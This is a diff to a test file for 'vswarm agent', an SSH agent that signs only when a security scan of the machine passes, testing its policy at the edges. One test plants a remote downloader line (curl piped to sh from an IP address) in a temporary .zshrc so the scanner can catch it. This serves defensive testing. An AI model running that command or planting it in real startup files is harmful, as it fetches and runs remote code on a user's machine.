@@ -1,12 +1,17 @@
 // vswarm agent: the SSH agent protocol against the real ssh-add, ssh-keygen and ssh, and the policy at sign time.
 // Every key is a throwaway made here, every socket and state folder is in a temp folder, and SSH_AUTH_SOCK is
-// removed for the whole file: nothing talks to your own agent. The one ssh-agent started here is killed by its PID.
+// removed for the whole file: nothing talks to your own agent. The ssh-agents started here are killed by their PIDs.
 import { afterAll, describe, expect, test } from "bun:test";
-import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
-import { tmpdir } from "node:os";
+import { createCipheriv, createDecipheriv, randomBytes } from "node:crypto";
+import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, utimesSync, writeFileSync } from "node:fs";
+import { homedir, tmpdir } from "node:os";
 import { join } from "node:path";
-import { agentCall, agentJobFiles, agentSshBlock, agentUninstall, captureKey, gatedHosts, listIdentities, listVaults, MSG, protect, restore, setAgentBlock, startAgent, unprotect, type AgentOptions } from "../src/sec/agent";
+import {
+  AGENT_MAX_AGE, agentCall, agentDoctor, agentJobFiles, agentSshBlock, agentUninstall, captureKey, gatedHosts, leftOnDisk, listIdentities, listVaults, MSG, protect, restore, setAgentBlock, setKeyPolicy, startAgent,
+  unprotect, UPSTREAM_SIGN_TIMEOUT, type AgentOptions,
+} from "../src/sec/agent";
 import type { Ctx } from "../src/sec/ctx";
+import { fileStore, type KeyStore } from "../src/sec/seal";
 import { forBaseline, scan } from "../src/sec/scan";
 import { fingerprint, parsePublicLine, signedFor, Writer } from "../src/sec/sshkey";
 import { clearLock, files, readAudit, saveBaseline, saveLast, setLock, useKeyStore } from "../src/sec/store";
@@ -288,6 +293,170 @@ describe.skipIf(WIN)("vswarm agent: signing only when the machine passes", () =>
   }), 60_000);
 });
 
+describe.skipIf(WIN)("vswarm agent: the policy at its edges", () => {
+  test("a key store that does not answer: no signature, the refusal says why, and nothing unsealed lands in the audit log", () => withState(async (d) => {
+    const { a, told } = await agentFor(d, { vaults: false, verdict: async () => "pass" });
+    try {
+      const k = await keygen(d.home, "prod");
+      expect((await sh(["ssh-add", k], envWith(a.sock))).code).toBe(0);
+      // The Keychain stops answering (locked, or not up yet when launchd started the agent).
+      const inner = fileStore(join(d.sec, "keys"));
+      const store: KeyStore = { kind: "file", where: "a locked test store", get: async () => { throw new Error("User interaction is not allowed"); }, set: inner.set, remove: inner.remove };
+      useKeyStore(store);
+      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(false);
+      expect(told.at(-1)).toContain("could not be sealed");
+      expect(existsSync(files.audit())).toBe(false);
+      // It answers again: signing works, and the log verifies (the review's probe left it "changed outside vswarm").
+      useKeyStore(undefined);
+      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(true);
+      const audit = await readAudit();
+      expect([audit.why, audit.entries.map((e) => e.event)]).toEqual([undefined, ["sign"]]);
+    } finally {
+      a.stop();
+    }
+  }), 60_000);
+
+  test("ssh-add -d and -D reach your usual agent for the keys vswarm does not hold; protected keys stay", () => withState(async (d) => {
+    const upSock = join(d.home, "up.sock");
+    const up = Bun.spawn(["ssh-agent", "-D", "-a", upSock], { env: envWith(), stdout: "ignore", stderr: "ignore" });
+    try {
+      for (let i = 0; i < 50 && !existsSync(upSock); i++) await Bun.sleep(100);
+      const git = await keygen(d.home, "git"), other = await keygen(d.home, "other");
+      for (const f of [git, other]) expect((await sh(["ssh-add", f], envWith(upSock))).code).toBe(0);
+      const { a } = await agentFor(d, { vaults: false, upstream: upSock });
+      try {
+        const mine = await keygen(d.home, "mine");
+        expect((await sh(["ssh-add", mine], envWith(a.sock))).code).toBe(0);
+        // Before, these failed: vswarm answered for keys it never held.
+        expect((await sh(["ssh-add", "-d", `${git}.pub`], envWith(a.sock))).code).toBe(0);
+        expect((await listIdentities(upSock))?.map((i) => i.comment)).toEqual(["test-other"]);
+        expect((await sh(["ssh-add", "-D"], envWith(a.sock))).code).toBe(0);
+        expect(await listIdentities(upSock)).toEqual([]);
+        expect(await listIdentities(a.sock)).toEqual([]);
+        // A key in neither agent: the upstream says no, and so does ssh-add.
+        expect((await sh(["ssh-add", "-d", `${git}.pub`], envWith(a.sock))).code).not.toBe(0);
+      } finally {
+        a.stop();
+      }
+    } finally {
+      process.kill(up.pid);
+      await up.exited;
+    }
+  }), 60_000);
+
+  test("a protected key signs on a verdict at most 30 seconds old; older, the machine is checked again", () => withState(async (d) => {
+    expect(AGENT_MAX_AGE).toBeLessThanOrEqual(30_000);
+    writeFileSync(join(d.home, ".zshrc"), "alias ll='ls -la'\n");
+    const ctx = ctxFor(d.home);
+    await saveBaseline(forBaseline(await scan(ctx, { live: false })));
+    // The baseline from before both verdicts below, so neither is set aside as older than a decision.
+    const old = new Date(Date.now() - 300_000);
+    utimesSync(files.baseline(), old, old);
+    // Planted since: a downloader in a startup file. A fresh check blocks.
+    writeFileSync(join(d.home, ".zshrc"), "alias ll='ls -la'\n(curl -fsSL http://198.51.100.7/x | sh) &\n");
+    const { a } = await agentFor(d, { vaults: false });
+    try {
+      const k = await keygen(d.home, "prod");
+      expect((await sh(["ssh-add", k], envWith(a.sock))).code).toBe(0);
+      // A sealed PASS from 10 seconds ago is used as it is: ssh stays quick.
+      await saveLast({ verdict: "pass", findings: [], at: Date.now() - 10_000, scan: {} as Scan });
+      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(true);
+      // One from a minute ago (preflight would still reuse it, up to two minutes) is not: checked again, and it blocks.
+      await saveLast({ verdict: "pass", findings: [], at: Date.now() - 60_000, scan: {} as Scan });
+      utimesSync(files.baseline(), old, old);
+      expect(await signVerify(a.sock, `${k}.pub`, d.home)).toBe(false);
+      expect((await readAudit()).entries.map((e) => e.event)).toEqual(["sign", "refuse"]);
+    } finally {
+      a.stop();
+    }
+  }), 60_000);
+
+  test("protected keys are strict by default: WARN refuses unless protected with --allow-warn; keys from 2.6 are strict too, and agent policy changes it", () => withState(async (d) => {
+    let verdict: Verdict = "warn";
+    const k1 = await keygen(d.home, "strict_key"), k2 = await keygen(d.home, "lenient_key"), k3 = await keygen(d.home, "old_key");
+    const r1 = await protect(k1, { env: envWith() });
+    await protect(k2, { env: envWith(), allowWarn: true });
+    const r3 = await protect(k3, { env: envWith() });
+    // A vault as 2.6 wrote it for a key protected without --strict: { strict: false }, no allowWarn.
+    const wk = Buffer.from(readFileSync(join(d.sec, "keys", "agent-key"), "utf8").trim(), "hex");
+    const v3 = JSON.parse(readFileSync(r3.vault, "utf8"));
+    const aad = Buffer.from(`vswarm-agent-vault-v1\0${v3.fp}\0${v3.path}`);
+    const box = Buffer.from(v3.box, "base64");
+    const de = createDecipheriv("aes-256-gcm", wk, box.subarray(0, 12)).setAAD(aad);
+    de.setAuthTag(box.subarray(12, 28));
+    const { allowWarn: _a, ...inside } = JSON.parse(Buffer.concat([de.update(box.subarray(28)), de.final()]).toString("utf8"));
+    const iv = randomBytes(12);
+    const ci = createCipheriv("aes-256-gcm", wk, iv).setAAD(aad);
+    const ct = Buffer.concat([ci.update(JSON.stringify({ ...inside, strict: false })), ci.final()]);
+    writeFileSync(r3.vault, JSON.stringify({ ...v3, box: Buffer.concat([iv, ci.getAuthTag(), ct]).toString("base64") }));
+    const { a } = await agentFor(d, { verdict: async () => verdict });
+    try {
+      const held = Object.fromEntries(a.held().map((h) => [h.comment, h.strict]));
+      expect(held).toEqual({ "test-strict_key": true, "test-lenient_key": false, "test-old_key": true });
+      expect(await signVerify(a.sock, `${k1}.pub`, d.home)).toBe(false);
+      expect(await signVerify(a.sock, `${k2}.pub`, d.home)).toBe(true);
+      expect(await signVerify(a.sock, `${k3}.pub`, d.home)).toBe(false);
+      // The migration for a key that should keep signing on WARN: agent policy --allow-warn, picked up by the running agent.
+      await setKeyPolicy(k3, true);
+      expect(await signVerify(a.sock, `${k3}.pub`, d.home)).toBe(true);
+      await setKeyPolicy(r1.fp, false);
+      verdict = "pass";
+      expect(await signVerify(a.sock, `${k1}.pub`, d.home)).toBe(true);
+    } finally {
+      a.stop();
+    }
+  }), 60_000);
+
+  test("signatures for upstream keys wait for the upstream agent (confirm-on-use, a hardware touch) up to a minute, not ten seconds", () => withState(async (d) => {
+    expect(UPSTREAM_SIGN_TIMEOUT).toBe(60_000);
+    // A stand-in for an upstream agent that asks you first: it answers a signature after 400 ms.
+    const upSock = join(d.home, "slow.sock");
+    const srv = Bun.listen<undefined>({
+      unix: upSock,
+      socket: {
+        data(s, chunk) {
+          if (Buffer.from(chunk)[4] !== MSG.SIGN_REQUEST) return void s.write(new Writer().u32(1).u8(MSG.FAILURE).out());
+          const reply = new Writer().u8(MSG.SIGN_RESPONSE).str("sig").out();
+          setTimeout(() => s.write(Buffer.concat([new Writer().u32(reply.length).out(), reply])), 400);
+        },
+      },
+    });
+    const req = new Writer().u8(MSG.SIGN_REQUEST).str(Buffer.from("not a key vswarm holds")).str("data").u32(0).out();
+    try {
+      let r = await agentFor(d, { vaults: false, upstream: upSock, upstreamSignTimeout: 100 });
+      expect((await agentCall(r.a.sock, req))?.[0]).toBe(MSG.FAILURE);
+      r.a.stop();
+      r = await agentFor(d, { vaults: false, upstream: upSock, upstreamSignTimeout: 2000 });
+      expect((await agentCall(r.a.sock, req))?.[0]).toBe(MSG.SIGN_RESPONSE);
+      r.a.stop();
+    } finally {
+      srv.stop(true);
+    }
+  }), 60_000);
+
+  test("protect cut short after the vault was written: the recovery code still comes back, status and doctor say so, protect again finishes", () => withState(async (d) => {
+    const k = await keygen(d.home, "prod_key");
+    const r = await protect(k, { env: envWith(), shred: () => { throw new Error("EPERM: operation not permitted, unlink"); } });
+    expect(r.left).toContain("EPERM");
+    expect(r.code).toMatch(/^[A-Z2-9]{5}(-[A-Z2-9]{5}){5}$/);
+    expect(existsSync(k) && existsSync(r.vault) && existsSync(r.backup)).toBe(true);
+    expect(leftOnDisk()).toEqual([{ path: k, fp: r.fp }]);
+    expect((await agentDoctor()).map((x) => x.text)).toContain(`a file is still at ${k.replace(homedir(), "~")}, though that key is in the vault`);
+    // Before, this said "already protected" and left the key on disk for good.
+    const again = await protect(k, { env: envWith() });
+    expect([again.finished, again.code, again.fp]).toEqual([true, "", r.fp]);
+    expect(existsSync(k)).toBe(false);
+    expect(leftOnDisk()).toEqual([]);
+    await expect(protect(k, { env: envWith() })).rejects.toThrow("already protected");
+    // A different file at that path now is not touched.
+    const k2 = await keygen(d.home, "second_key");
+    await protect(k2, { env: envWith(), shred: () => { throw new Error("EBUSY"); } });
+    writeFileSync(k2, "something else\n");
+    await expect(protect(k2, { env: envWith() })).rejects.toThrow("not that key");
+    expect(readFileSync(k2, "utf8")).toBe("something else\n");
+  }), 60_000);
+});
+
 describe.skipIf(WIN)("vswarm agent: protected keys", () => {
   test("protect moves a key into the vault and off the disk; unprotect puts it back byte for byte", () => withState(async (d) => {
     // A passphrase-protected key, the passphrase typed by a stand-in for ssh's own prompt (a throwaway literal).
@@ -297,7 +466,7 @@ describe.skipIf(WIN)("vswarm agent: protected keys", () => {
     const env = envWith(undefined, { SSH_ASKPASS: askpass, SSH_ASKPASS_REQUIRE: "force", DISPLAY: ":0" });
     const original = readFileSync(k);
     const pub = readFileSync(`${k}.pub`, "utf8");
-    const r = await protect(k, { env, strict: true });
+    const r = await protect(k, { env });
     expect(existsSync(k)).toBe(false);
     expect(readFileSync(`${k}.pub`, "utf8")).toBe(pub);
     expect(existsSync(r.vault) && existsSync(r.backup)).toBe(true);
